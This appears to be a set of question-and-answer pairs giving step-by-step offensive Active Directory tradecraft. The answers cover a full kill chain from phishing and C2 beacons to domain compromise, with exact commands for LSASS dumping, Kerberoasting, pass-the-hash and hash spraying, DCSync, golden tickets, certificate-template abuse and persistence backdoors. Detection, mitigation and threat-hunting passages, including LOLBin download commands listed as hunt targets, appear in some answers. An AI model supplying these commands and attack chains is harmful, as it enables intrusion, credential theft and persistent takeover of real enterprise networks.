I need a full kill chain for compromising an enterprise Active Directory environment from initial access through domain compromise.

Full AD kill chain: Phase 1 — Initial Access: spearphish with macro-enabled Office doc or HTML smuggling (drops Cobalt Strike/Havoc beacon). Alternatively exploit internet-facing service (Citrix, Exchange ProxyShell, VPN). Phase 2 — Establish Foothold: deploy C2 beacon with HTTPS to legit-looking domain (categorized, aged). Run from memory only (process injection). Phase 3 — Local Recon: whoami /all, net user, ipconfig /all, systeminfo. Check for AV: tasklist /svc, sc query. Phase 4 — Privilege Escalation: PowerUp/PEASS to identify misconfigs. Common wins: unquoted service paths, weak service permissions, token impersonation (Incognito/SweetPotato), CVE-2021-1675 PrintNightmare, CVE-2022-21999 SpoolFool, Juicy/Rogue/Sweet Potato for SeImpersonatePrivilege. Phase 5 — Credential Access: Mimikatz sekurlsa::logonpasswords for LSASS dump (or SilentProcessExit technique to dump LSASS without touching it directly). Kerberoasting: Rubeus kerberoast /outfile:hashes.txt, crack with hashcat -m 13100. AS-REP roasting: Rubeus asreproast. Phase 6 — Lateral Movement: Pass-the-Hash with wmiexec/psexec, Pass-the-Ticket with captured Kerberos TGT. BloodHound for shortest path to Domain Admin. Phase 7 — Domain Compromise: DCSync (Mimikatz lsadump::dcsync /domain:corp.local /all) dumps all hashes. Golden Ticket: forge TGT with KRBTGT hash. Phase 8 — Persistence: skeleton key, DCShadow, adding backdoor admin account, deploying implant via Group Policy.

Explain BloodHound and how to use it to find the fastest path to Domain Admin.

BloodHound maps Active Directory relationships and attack paths using graph theory. Setup: deploy SharpHound collector (C# ingestor) on compromised host: SharpHound.exe -c All,GPOLocalGroup --zipfilename data.zip. Import ZIP to BloodHound. Key queries: 'Find Shortest Paths to Domain Admins' — automatically calculates all attack paths using Dijkstra's algorithm. Useful prebuilt queries: 'Find Principals with DCSync Rights', 'Find Computers where Domain Users are Local Admin', 'Shortest Paths from Owned Principals'. Mark compromised hosts/users as owned with right-click. BloodHound shows the exact attack chain: User A has GenericAll over Group B → Group B has WriteDACL on OU C → OU C contains Domain Admin account. Abuse relationships: GenericAll/GenericWrite over user → set SPN (Kerberoast), change password. WriteDACL → grant self DCSync rights. AllowedToDelegate → constrained delegation attack. AllowedToAct → resource-based constrained delegation. ForceChangePassword → change password. Admin rights on computer → dump LSASS. BloodHound 4.0 added Azure/Entra ID attack paths — same graph theory applied to cloud.

Walk through a Kerberoasting attack from detection to cracking to usage.

Kerberoasting targets service accounts with SPNs (Service Principal Names) registered in AD. Any domain user can request a Kerberos service ticket (TGS) for any SPN — the TGS is encrypted with the service account's NTLM hash. This is by design and generates no alert without proper monitoring. Step 1 — Enumerate SPNs: setspn -T domain -Q */* from Windows, or from Linux: GetUserSPNs.py domain/user:password -dc-ip DC_IP. Step 2 — Request TGS: Rubeus kerberoast /outfile:hashes.txt (requests TGS for all SPNs). impacket: GetUserSPNs.py domain/user:password -dc-ip DC_IP -request -outputfile hashes.txt. Step 3 — Crack: hashcat -m 13100 hashes.txt rockyou.txt --rules-file best64.rule. Target service accounts often have weak passwords (set years ago, never changed, not in scope for password policies). Step 4 — Use cracked credentials: net use \server\share /user:domain\serviceaccount password. If service account is local admin on servers: wmiexec.py, psexec.py. If service account has DCSync rights (common for SQL service accounts): Mimikatz lsadump::dcsync. Detection: Windows Event ID 4769 (TGS request) with encryption type 0x17 (RC4) from non-service account. Mitigation: use gMSA (group Managed Service Accounts), enforce AES-only Kerberos.

What is Pass-the-Hash and how do you use it for lateral movement?

Pass-the-Hash (PtH) uses a captured NTLM hash to authenticate without knowing the plaintext password. NTLM authentication doesn't require the actual password — the hash IS the credential. Capture hashes: Mimikatz sekurlsa::logonpasswords dumps hashes from LSASS memory. Requires local admin/SYSTEM. Alternative: reg save HKLM\SYSTEM system.hive && reg save HKLM\SAM sam.hive → secretsdump.py -sam sam.hive -system system.hive LOCAL. Tools: impacket suite (Linux): wmiexec.py -hashes LM:NTLM domain/user@target. psexec.py -hashes LM:NTLM domain/user@target cmd.exe. smbexec.py, atexec.py, dcomexec.py — all accept hashes. Cobalt Strike: pth command. CrackMapExec: cme smb 192.168.1.0/24 -u admin -H NTLM_HASH --local-auth to spray hash across subnet. Winrm: evil-winrm -i target -u user -H hash. RDP: xfreerdp /u:user /pth:NTLM_HASH /v:target (requires restricted admin mode enabled). Limitations: only works for NTLM auth (not Kerberos). Mitigation: Credential Guard virtualizes LSASS, prevents NTLM hash extraction from memory. Local admin account disabled (disables SMB lateral movement).

How does DCSync work and what can you do with the KRBTGT hash?

DCSync mimics a Domain Controller's replication protocol (MS-DRSR) to request password data for any account including KRBTGT — the master Kerberos ticket-signing account. Requirements: Replicating Directory Changes and Replicating Directory Changes All rights — granted to Domain Admins, Enterprise Admins, and any account explicitly granted these permissions. Command: Mimikatz lsadump::dcsync /domain:corp.local /user:krbtgt — dumps KRBTGT NT hash and previous hash. With impacket: secretsdump.py domain/admin:password@DC_IP -just-dc-user krbtgt. KRBTGT hash usage — Golden Ticket attack: Mimikatz kerberos::golden /domain:corp.local /sid:S-1-5-21-xxx /krbtgt:HASH /user:Administrator /id:500 /groups:512 /ticket:golden.kirbi. This forges a valid TGT for any user with any group memberships. kerberos::ptt golden.kirbi loads the ticket. Now authenticated as Domain Admin on any machine. Golden tickets survive password resets — valid until KRBTGT password changed TWICE. Persistence value: even after incident response and password resets, if KRBTGT not changed (requires two changes 10 hours apart), Golden Ticket remains valid. Detection: Event ID 4769 with unusually high privilege, Mimikatz signatures in memory.

Explain Active Directory Certificate Services (ADCS) attacks — ESC1 through ESC8.

ADCS attack techniques (Will Schroeder, Lee Christensen — 'Certified Pre-Owned'): ESC1 — Enrollee Supplies Subject: Certificate template allows requestor to specify Subject Alternative Name (SAN). Any user can request cert with SAN = Administrator@domain → use cert to authenticate as Domain Admin. certutil or certipy: certipy req -username user@domain -password pass -ca CA_NAME -template TEMPLATE -upn administrator@domain. ESC2 — Any Purpose EKU: Template usable for any purpose including client auth. ESC3 — Enrollment Agent: Template allows requesting certs on behalf of other users. ESC4 — Vulnerable Template ACL: Low-priv user has write access to template — modify template to ESC1 conditions. ESC5 — Vulnerable PKI Object ACL: Control over CA object or ADCS server itself. ESC6 — EDITF_ATTRIBUTESUBJECTALTNAME2: CA flag allows SAN in any request. ESC7 — Vulnerable CA ACL: ManageCA right allows enabling ESC6 flag. ESC8 — NTLM Relay to AD CS HTTP Endpoints: Coerce DC authentication (PetitPotam, PrinterBug), relay NTLM to ADCS web enrollment → get DC certificate → DCSync via Kerberos. Certipy tool automates all ESC variants: certipy find -username user@domain -password pass -dc-ip DC_IP for enumeration.

How do you conduct a red team engagement from scoping to debrief?

Full red team engagement lifecycle: Scoping: define objectives (domain admin, data exfil, physical access), authorized IP ranges, off-limits systems (production DBs), rules of engagement (working hours, emergency stop word), engagement window. Planning: threat model — which APT group TTPs to emulate? MITRE ATT&CK navigator for planning coverage. OSINT phase — passive recon of target, attack surface mapping. Infrastructure: C2 infrastructure setup (categorized domains, valid SSL, legitimate-looking hostnames), redirectors, payload hosting, C2 profile (Malleable C2 for CS to blend with legitimate traffic). Initial Access phase: phishing campaign (GoPhish), exploitation of external vulnerabilities, physical intrusion/tailgating if in scope. Internal ops: escalate privileges, move laterally, establish persistence, achieve objectives. Document everything: timestamps, commands, screenshots, C2 logs — evidence chain for report. Exfiltration simulation: exfil test data over DNS/HTTPS to prove data could leave network. Debrief: notify blue team immediately after completion, provide IoCs from the engagement, walk through attack chain in Purple Team review, produce written report: Executive Summary (business impact), Technical Narrative (step-by-step), Findings (each vulnerability), Remediation Roadmap (prioritized by risk).

What are the most effective initial access techniques in 2024-2025?

Current highest-yield initial access vectors: 1) Phishing with HTML smuggling: HTML file containing encoded payload decoded by JavaScript on client side — bypasses email attachment scanning. Drops ISO/ZIP containing LNK file. 2) Microsoft Teams phishing: External tenants can message any Teams user. Pretend to be IT support, send malicious link. No email security gateway. 3) Browser-in-the-Browser (BitB): fake browser popup that looks like legitimate OAuth window — captures SSO credentials. 4) SEO poisoning: malicious files ranked for searches like 'download advanced IP scanner' or 'free adobe premiere download'. 5) Malvertising: legitimate ad networks serving malicious JavaScript. 6) QR code phishing (Quishing): bypass email security that doesn't process QR code destinations. 7) PDF with embedded link: security gateways often don't follow PDF links. 8) Callback phishing (vishing): email says 'call this number about your account' → phone operator does real-time social engineering and AnyDesk/TeamViewer install. 9) EvilProxy/Evilginx campaigns against O365: bypass MFA. 10) Supply chain: compromise a trusted software vendor's update mechanism. 11) Exploit internet-facing services: CitrixBleed (CVE-2023-4966), Ivanti (CVE-2024-21887), PAN-OS (CVE-2024-3400).

How does Mimikatz work and what are all its capabilities?

Mimikatz (Benjamin Delpy) is the canonical Windows credential extraction tool. Core modules: sekurlsa — interacts with LSASS memory: sekurlsa::logonpasswords (NTLM hashes + cleartext passwords), sekurlsa::wdigest (cleartext passwords — disabled in Win8.1+, can re-enable via registry), sekurlsa::kerberos (Kerberos tickets), sekurlsa::msv (MSV hashes), sekurlsa::dpapi (DPAPI master keys). lsadump — interacts with SAM/NTDS: lsadump::sam (local SAM database), lsadump::dcsync (replication API to dump any AD account), lsadump::lsa /patch (patch LSASS to dump all domain hashes), lsadump::cache (cached domain credentials). kerberos — ticket operations: kerberos::list (list tickets), kerberos::ptt (pass-the-ticket), kerberos::golden (forge golden ticket), kerberos::silver (forge silver ticket for specific service). crypto — certificate operations, DPAPI: dpapi::cred (decrypt DPAPI-protected credentials), dpapi::chrome (Chrome saved passwords). privilege — token manipulation: privilege::debug (get SeDebugPrivilege). misc — misc functions: misc::skeleton (skeleton key backdoor patches KDC). Execution: requires SYSTEM or SeDebugPrivilege for most operations. OPSEC: invoke-mimikatz loads from memory, avoids disk. Modern EDRs detect via process hollowing and direct LSASS access patterns.

Explain threat hunting methodology and how to hunt for living-off-the-land attacks.

Threat hunting is proactive searching for threats that have bypassed automated detection. Methodology: Hypothesis-driven: start with specific TTP (e.g., 'Adversary using PowerShell for discovery') → hunt for evidence in logs. Intel-driven: current threat intel (ISAC, CISA advisories) drives hypothesis. TTP-based: MITRE ATT&CK — pick under-detected techniques. LotL (Living off the Land) hunting — adversaries use built-in Windows tools (PowerShell, WMI, WMIC, certutil, mshta, regsvr32, cscript, msiexec, rundll32): PowerShell: hunt for encoded commands (contains '-enc' or '-EncodedCommand'), unusual parent processes (Word, Outlook spawning PowerShell), execution from temp/user directories. WMIC: hunt for wmic process call create with network connections, wmic /node: (remote execution). Certutil: certutil -urlcache -split -f (file download) — hunt in process command lines. LOLBin abuse: regsvr32 /s /n /u /i: (Squiblydoo), mshta http://, rundll32 executing from unusual DLL paths. Data sources: Windows Event Logs (4688 with command line, 4104 PowerShell script block logging, 4624/4625 auth, 7045 new service), Sysmon (process creation with full command line, network connections, file creation), EDR telemetry. Tooling: Sigma rules for SIEM, YARA for file-based hunting, Velociraptor for enterprise-scale artifact collection.
